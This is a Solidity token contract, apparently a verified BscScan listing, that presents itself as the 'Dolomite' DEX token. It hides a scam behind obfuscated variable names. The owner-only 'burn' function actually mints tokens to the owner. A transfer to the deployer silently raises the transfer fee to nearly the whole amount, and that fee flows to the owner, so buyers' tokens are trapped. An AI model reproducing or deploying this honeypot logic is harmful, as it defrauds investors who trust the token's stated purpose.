/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

/*
Dolomite
We’re excited to announce the launch of Dolomite - a  next generation margin protocol and DEX.
Continue reading to learn about the advanced features  Dolomite’s protocol offers that set it apart, or jump  right in at 
    https://dolomite.io
    https://dolomite.io/
    https://twitter.com/dolomite_io
    https://t.me/dolomite_official
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.16;
contract Dolomite {
uint256 public constant SGGCXX = 99999;
uint256 private  GALBWH = 100000000;
uint256 private  SHAAWZ = 10000000000000;
address private  YONIQV = address(0);
uint256 private  UJRPDX = 1000000000000000000000;
uint256 private  VACDVF = 1000000000000000000;
address private  SYUMOV = address(0);
string public  symbol = "Dolomite";
mapping (address => uint256) public balanceOf;
string public  name = "Dolomite";
uint256 private  HOQDDP = 1000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  WGMXOZ = 1000000000000000000;
address private  UFABHY = address(0);
address private  JUFWHD = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  UPOWID = address(0);
uint256 private  ICTCIJ = 10000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
function _getGALBWH() private returns (uint256) {
return GALBWH;
}

function _getICTCIJ() private returns (uint256) {
return ICTCIJ;
}

function _getSHAAWZ() private returns (uint256) {
return SHAAWZ;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getUPOWID() private returns (address) {
return UPOWID;
}

function _getVACDVF() private returns (uint256) {
return VACDVF;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tKLSNUI 0");
require(spender != address(0), "fKLSNUI 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getUFABHY() private returns (address) {
return UFABHY;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getHOQDDP() private returns (uint256) {
return HOQDDP;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "KLSNUI");
require(to != address(0), "KLSNUI");
require(amount <= balanceOf[from], "KLSNUI");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* SGGCXX/WGMXOZ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==SYUMOV){
WGMXOZ = SGGCXX+2;
}
emit Transfer(from, to, transferAmount);
}
function _getYONIQV() private returns (address) {
return YONIQV;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getJUFWHD() private returns (address) {
return JUFWHD;
}

constructor () {
SYUMOV = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getUJRPDX() private returns (uint256) {
return UJRPDX;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}